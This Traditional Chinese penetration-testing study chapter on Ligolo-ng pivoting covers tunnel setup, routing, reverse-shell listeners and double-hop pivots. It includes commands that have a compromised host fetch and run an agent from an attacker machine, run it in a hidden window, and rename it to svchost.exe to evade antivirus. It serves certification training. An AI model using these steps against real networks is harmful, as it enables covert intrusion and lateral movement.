# 第 67 章 - Ligolo-ng

## 標籤

- #cpts
- #chapter
- #ligolo-ng
- #pivoting

## 學習目標

- 理解 Ligolo-ng 為什麼比 SOCKS proxy 更強，差異在哪裡。
- 掌握每個設定步驟的原理，知道哪裡出錯要去哪裡查。
- 能正確設定路由、接收 reverse shell、做雙跳 pivot。
- 知道每個指令的每個選項是什麼意思。

---

## 理論基礎：Ligolo-ng 和 SOCKS Proxy 的根本差異

### SOCKS Proxy（Chisel / SSH -D）

```
Kali 工具 → proxychains → SOCKS5(localhost:1080) → 跳板機 → 目標
```

每個工具都必須「知道」且「支援」SOCKS 協定。如果工具不支援 SOCKS（例如 nmap 預設的 SYN scan），就要想辦法繞。

### Ligolo-ng（路由式）

```
Kali 工具 → 系統路由表 → ligolo tun 介面 → SSH-like 隧道 → 跳板機的 agent → 目標
```

Ligolo-ng 在 Kali 建立一個虛擬網路介面（像是虛擬網卡），然後把目標網段的路由指向這個介面。從作業系統的角度來看，172.16.139.0/24 就像是直接接在 Kali 上的網段。工具完全不用修改，連 proxychains 都不需要。

### 關鍵結論

| 比較 | SOCKS Proxy | Ligolo-ng |
|------|-------------|-----------|
| nmap SYN scan | ❌ 不支援 | ✅ 直接跑 |
| 需要 proxychains | ✅ 每個指令都要加 | ❌ 不需要 |
| 多個工具並行 | 容易衝突 | ✅ 正常 |
| 設定複雜度 | 低 | 中（要加路由） |
| 適合掃整個網段 | 慢且不準 | ✅ 快速準確 |

---

## 架構圖

```
Kali（proxy）
├── ligolo tun 介面（虛擬網卡）
├── 路由：172.16.139.0/24 → dev ligolo
└── proxy 程式（監聽 11601 port，等 agent 連入）
        ↑
        │ TLS 加密隧道
        ↓
跳板機（agent）
├── agent 程式（連回 Kali proxy）
└── 能到達的內網：172.16.139.0/24
        ↓
   內網目標（DC、SRV 等）
```

---

## 準備工作

### 下載 proxy 和 agent

```bash
# Kali 端 — 下載 proxy
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2/ligolo-ng_proxy_0.7.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_proxy_0.7.2_linux_amd64.tar.gz
chmod +x proxy

# 下載 agent（依跳板機的 OS 選擇）
# Linux 跳板機
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2/ligolo-ng_agent_0.7.2_linux_amd64.tar.gz
tar -xzf ligolo-ng_agent_0.7.2_linux_amd64.tar.gz

# Windows 跳板機
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2/ligolo-ng_agent_0.7.2_windows_amd64.zip
unzip ligolo-ng_agent_0.7.2_windows_amd64.zip
```

---

## 完整設定流程（六步驟）

### Step 1 — 建立虛擬 tun 介面（Kali，只需做一次）

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
# ip tuntap add  → 建立一個 tun（隧道）或 tap（橋接）裝置
# user $(whoami) → 這個介面的擁有者是目前登入的使用者（讓你不用 sudo 就能用）
# mode tun       → tun 模式（第三層，處理 IP 封包）；tap 是第二層（Ethernet），這裡用 tun
# ligolo         → 介面名稱，隨便取，這裡叫 ligolo

sudo ip link set ligolo up
# ip link set ... up → 啟動介面，讓它開始工作
# 沒有這步，介面建立了但不工作

# 確認介面有在
ip a show ligolo
# 應該看到 ligolo 介面，狀態是 UP，目前沒有 IP（正常，Ligolo-ng 不需要設 IP）
```

### Step 2 — 啟動 Proxy（Kali）

```bash
./proxy -selfcert -laddr 0.0.0.0:11601
# -selfcert        → 自動產生自簽 TLS 憑證，讓隧道加密
#                    不用你自己準備憑證，適合考試環境
# -laddr 0.0.0.0:11601 → 監聽所有介面的 11601 port，等 agent 連進來
#                        0.0.0.0 = 所有網路介面；只想聽特定介面改成該 IP
#                        11601 是預設 port，可換成 443/80 繞防火牆

# 啟動後會出現互動式介面：
# ligolo-ng »
```

**選項補充：**

| 選項 | 作用 |
|------|------|
| `-selfcert` | 自動自簽憑證（考試用這個，省事） |
| `-certfile / -keyfile` | 指定自己的 TLS 憑證（正式環境用） |
| `-laddr 0.0.0.0:PORT` | 監聽地址和 port |
| `-tun ligolo` | 明確指定用哪個 tun 介面（有多個時用） |
| `-v` | verbose 輸出，排查時開 |

### Step 3 — 上傳並執行 Agent（跳板機）

```bash
# 方法一：Kali 開 HTTP server，跳板機下載
python3 -m http.server 8000   # Kali 端

# Linux 跳板機
wget http://KALI_IP:8000/agent -O /tmp/agent
chmod +x /tmp/agent
/tmp/agent -connect KALI_IP:11601 -ignore-cert
# -connect KALI_IP:11601  → 連回 Kali proxy 的地址和 port
# -ignore-cert            → 忽略 TLS 憑證驗證（自簽憑證必須加，否則連線被拒）

# Windows 跳板機（PowerShell）
(New-Object Net.WebClient).DownloadFile('http://KALI_IP:8000/agent.exe','C:\Windows\Temp\agent.exe')
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert

# 背景執行（Windows，不讓使用者看到視窗）
Start-Process -WindowStyle Hidden -FilePath "C:\Windows\Temp\agent.exe" `
  -ArgumentList "-connect KALI_IP:11601 -ignore-cert"
# -WindowStyle Hidden → 不顯示視窗
# -FilePath           → 執行檔路徑
# -ArgumentList       → 傳給程式的參數

# evil-winrm 直接上傳
upload /tmp/agent.exe C:\Windows\Temp\agent.exe
```

### Step 4 — Proxy 介面操作

Agent 連進來後，proxy 的互動介面會出現新的 session。

```
ligolo-ng » session
# 列出所有已連線的 agent，會顯示 ID、主機名、OS 等

# 選擇要用的 session（通常是第一個，ID 0）
ligolo-ng » session
# 按數字選，或直接輸入 0

# 查看跳板機的網路介面（找出內網網段！）
ligolo-ng » ifconfig
# 會列出跳板機的所有網卡和 IP
# 找出你要路由的內網網段，例如 172.16.139.0/24
# 這是決定待會要加什麼路由的關鍵步驟

# 啟動隧道
ligolo-ng » start
# 隧道開始工作，流量開始通
```

### Step 5 — Kali 加入路由

```bash
# 根據 ifconfig 看到的網段加路由
sudo ip route add 172.16.139.0/24 dev ligolo
# ip route add 172.16.139.0/24 → 要到這個網段
# dev ligolo                   → 走 ligolo 這個介面（就是那個虛擬網卡）

# 如果有多個內網網段，每個都要加
sudo ip route add 10.10.10.0/24 dev ligolo
sudo ip route add 192.168.100.0/24 dev ligolo2  # 第二跳的網段用 ligolo2

# 確認路由加進去了
ip route | grep ligolo
# 應該看到：172.16.139.0/24 dev ligolo scope link
```

**為什麼要加路由？**

作業系統不知道 172.16.139.0/24 在哪裡。如果你不加路由，封包打出去後系統找不到下一跳，直接丟棄。路由告訴系統「要去 172.16.139.x，就走 ligolo 這張網卡」，然後 Ligolo-ng 接手透過隧道送出去。

### Step 6 — 驗證

```bash
# ping（不需要 proxychains）
ping -c 1 172.16.139.3
# 能通代表路由和隧道都正常

# nmap 直接跑（不需要 proxychains，而且可以用 SYN scan）
nmap -sS -Pn -p 445,3389,5985,80,443 172.16.139.3
# -sS → SYN scan（快、準，Ligolo-ng 路由模式支援）
# -Pn → 不 ping，直接掃

# nxc 直接跑
nxc smb 172.16.139.0/24
nxc smb 172.16.139.3 -u Administrator -p 'Password!'

# evil-winrm 直接連
evil-winrm -i 172.16.139.35 -u Administrator -p 'Password!'
```

---

## 接收 Reverse Shell

問題：目標機（172.16.139.35）要打 reverse shell，shell 要怎麼打回 Kali？

直接打 Kali IP 通常不行，因為目標機不知道 Kali 在哪裡。解法是在 proxy 上開一個 listener，把流量轉到 Kali。

```bash
# 在 proxy 介面中加 listener
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
# --addr 0.0.0.0:4444  → 在跳板機（agent 所在機）的所有介面開 4444 port
# --to 127.0.0.1:4444  → 流量轉到 Kali 的 127.0.0.1:4444
# --tcp                → TCP 協定（reverse shell 用 TCP）

# 查看 listener 清單
ligolo-ng » listener_list

# Kali 開 nc 監聽
nc -lvnp 4444
# 或
rlwrap nc -lvnp 4444  # rlwrap 讓 shell 有方向鍵支援

# 目標機打 reverse shell → 連到跳板機 IP:4444
# 流量：目標機 → 跳板機:4444 → (listener) → Kali:4444
```

---

## 雙跳 Pivot（二層內網）

```
Kali → 跳板機1 (DMZ01, 10.129.10.5) → 跳板機2 (SRV01, 172.16.139.35) → DC01 (192.168.1.3)
```

```bash
# Step 1：先建立第一層（Kali → DMZ01）
# 按上面的標準步驟做，路由加 172.16.139.0/24 dev ligolo

# Step 2：在 proxy 加 listener，讓 SRV01 的 agent 能連進來
ligolo-ng » listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11602 --tcp
# 跳板機1 的 11602 port → Kali 的 11602 port

# Step 3：Kali 再開一個 proxy 監聽第二層（新的 terminal）
sudo ip tuntap add user $(whoami) mode tun ligolo2
sudo ip link set ligolo2 up
./proxy -selfcert -laddr 127.0.0.1:11602 -tun ligolo2
# 127.0.0.1:11602 → 只聽本機（因為是透過 listener 轉進來的）
# -tun ligolo2    → 用第二個 tun 介面

# Step 4：SRV01 上執行 agent（連到 DMZ01 的 11602，因為 listener 會幫你轉到 Kali）
.\agent.exe -connect 172.16.139.10:11602 -ignore-cert
# 172.16.139.10 是 DMZ01 在內網的 IP

# Step 5：加第二層路由
sudo ip route add 192.168.1.0/24 dev ligolo2

# 現在 Kali 可以直接存取 192.168.1.0/24（DC01 所在網段）
```

---

## 常見問題排查

| 現象 | 原因 | 解法 |
|------|------|------|
| Agent 連不上 Proxy | 防火牆擋 11601 | 改用 `-laddr 0.0.0.0:443` |
| `ping 172.16.139.3` 不通 | 路由沒加 | `sudo ip route add 172.16.139.0/24 dev ligolo` |
| nmap 掃不到 | tun 介面沒 up | `sudo ip link set ligolo up` |
| Reverse shell 接不到 | 沒加 listener | `listener_add --addr 0.0.0.0:PORT --to 127.0.0.1:PORT --tcp` |
| Windows agent 被 AV 殺 | 特徵碼 | 改名（agent_x64.exe → svchost.exe）或重新編譯 |
| 掃描速度慢或封包大小問題 | MTU 不一致 | `nmap --mtu 1200 ...` |
| `ip tuntap add` 失敗 | 介面已存在 | `sudo ip link del ligolo` 先刪除 |
| session 裡沒有 agent | agent 沒連上 | 看 proxy 那邊的輸出，確認 `-ignore-cert` 有加 |

---

## Ligolo-ng vs Chisel vs SSH 選擇決策

```text
需要掃整個網段（nmap SYN scan）？
├── 是 → Ligolo-ng（唯一選擇）
└── 否
      跳板機是 Linux 且有 SSH？
      ├── 是，只需要 1-2 個服務 → ssh -L（最快，不用上傳工具）
      ├── 是，需要多個工具 → ssh -D + proxychains
      └── 否（Windows 或沒 SSH）
            需要穿 HTTP/防火牆？
            ├── 是 → Chisel（HTTP 模式）
            └── 長時間、多工具 → Ligolo-ng
```

---

## 速查表

```bash
# === Kali 初始化（只做一次）===
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# === 啟動 Proxy ===
./proxy -selfcert -laddr 0.0.0.0:11601

# === 跳板機執行 Agent ===
./agent -connect KALI_IP:11601 -ignore-cert                     # Linux
.\agent.exe -connect KALI_IP:11601 -ignore-cert                 # Windows

# === Proxy 介面操作 ===
session       # 列出 agents
session 0     # 選 agent
ifconfig      # 看內網網段
start         # 啟動隧道

# === Kali 加路由 ===
sudo ip route add 172.16.139.0/24 dev ligolo

# === 接 Reverse Shell ===
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
nc -lvnp 4444

# === 驗證 ===
ping -c 1 172.16.139.3
nmap -sS -Pn -p 445,3389,5985 172.16.139.3
```

## 關聯筆記

- [[64-網路路由基礎|第 64 章 - 網路路由基礎]]
- [[65-SSH埠轉發|第 65 章 - SSH 埠轉發]]
- [[66-Chisel|第 66 章 - Chisel]]
- [[69-多跳Pivoting|第 69 章 - 多跳 Pivoting]]
- [[08-Volume-8-Pivoting-Index|Vol.8 - Pivoting, Tunneling and Port Forwarding]]
